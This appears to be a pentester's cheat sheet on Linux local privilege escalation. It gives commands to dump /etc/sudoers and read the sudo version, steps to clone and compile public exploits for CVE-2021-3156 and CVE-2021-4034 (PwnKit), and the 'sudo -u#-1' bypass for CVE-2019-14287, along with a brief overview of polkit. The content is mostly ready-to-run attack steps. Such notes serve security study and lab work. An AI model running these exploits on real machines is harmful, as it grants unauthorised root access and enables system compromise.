## Sudo
### sudoers file
```shell
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```
### Get Sudo Version
```shell
sudo -V | head -n1
```
### CVE-2021-3156
**Sudo verisons**
Ubuntu 20.04 - 1.8.31
Debian 10 - 1.8.28
Fedora 33 - 1.9.2 
#### Run
```shell
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
```
Get Which version you need
```shell
cat /etc/lsb-release
```
```shell
./sudo-hax-me-a-sandwich <id>
```
### CVE-2019-14287
https://www.sudo.ws/security/advisories/minus_1_uid/
Minus uid bug
```shell
sudo -u#-1 <binary>
```
## Polkit
* An authorisation service on Linux based operating systems that allow user software and system components to communicate with each other. 
* Checks whether the user software is authorised for the asked instruction.
* It is possible to set how permissions are granted by default for each user and application. 

Works with 2 groups of files:
1. actions/policies `/usr/share/polkit-1/actions`
2. rules `/usr/share/polkit-1/rules.d`

* Polkit has `local authoirty` which can be used to set or remove additional permissions for users and groups.
* Custom rules can go in `/etc/polkit-1/localauthroity/50-local.d`

Polkit comes with three additional prgorams
1. `pkexec` - Runs a program with the rights of another user or with root rights
2. `pkaction` - can be used to display actions
3. `pkcheck` - Can be used to check if a process if authorised for a specific action. 

### CVE-2021-4034
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034
* Also known as [Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)
* Memory corruption vulnerability
```shell
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
```